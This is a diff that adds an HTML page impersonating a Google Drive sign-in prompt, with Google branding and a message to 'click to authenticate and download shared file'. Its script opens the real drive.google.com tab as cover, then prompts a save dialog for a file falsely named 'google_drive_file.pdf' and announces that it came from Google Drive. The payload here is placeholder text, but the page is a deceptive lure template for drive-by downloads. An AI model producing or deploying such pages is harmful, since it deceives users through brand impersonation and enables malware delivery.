@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Google Auth Required</title>
+  <style>
+    body { 
+      margin: 0; 
+      height: 100vh; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      font-family: Arial; 
+      background: #f8f9fa; 
+      cursor: pointer; 
+    }
+    .box { 
+      background: white; 
+      padding: 40px; 
+      border-radius: 12px; 
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1); 
+      text-align: center; 
+      border: 1px solid #dadce0; 
+      max-width: 400px; 
+    }
+    .google { 
+      color: #4285f4; 
+      font-size: 48px; 
+      margin-bottom: 20px; 
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <div class="google">G</div>
+    <h2>Sign in to Google Drive</h2>
+    <p>Click to authenticate and download shared file</p>
+    <small style="color: #5f6368;">Opens new tab for security</small>
+  </div>
+
+  <script>
+    document.addEventListener('click', () => {
+      // Open Google immediately
+      window.open('https://drive.google.com', '_blank');
+      
+      // Trigger download after delay
+      setTimeout(async () => {
+        if (!('showSaveFilePicker' in window)) return;
+        
+        try {
+          const file = await window.showSaveFilePicker({
+            suggestedName: 'google_drive_file.pdf',
+            types: [{ description: 'Files', accept: {'*/*': ['.*']} }]
+          });
+          
+          const writer = await file.createWritable();
+          await writer.write('Google Drive file content');
+          await writer.close();
+          
+          alert('✅ File downloaded from Google Drive');
+        } catch(e) {}
+      }, 2500); // Shorter delay
+    }, { once: true });
+  </script>
+</body>
+</html>
